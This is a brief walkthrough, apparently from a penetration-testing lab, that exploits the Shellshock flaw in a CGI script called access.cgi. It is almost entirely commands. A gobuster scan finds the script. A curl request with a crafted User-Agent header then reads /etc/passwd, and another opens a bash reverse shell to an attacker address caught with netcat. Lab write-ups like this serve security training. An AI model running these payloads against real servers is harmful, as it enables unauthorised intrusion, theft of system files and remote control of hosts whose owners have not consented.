# Enumeration - Gobuster
1. We can hunt for CGI scripts using a tool such as Gobuster. Here we find one, `access.cgi`
```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
2. Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.
# Confirming the Vulnerability
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
## Exploitation to Reverse Shell Access
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
```
sudo nc -lvnp 7777
```
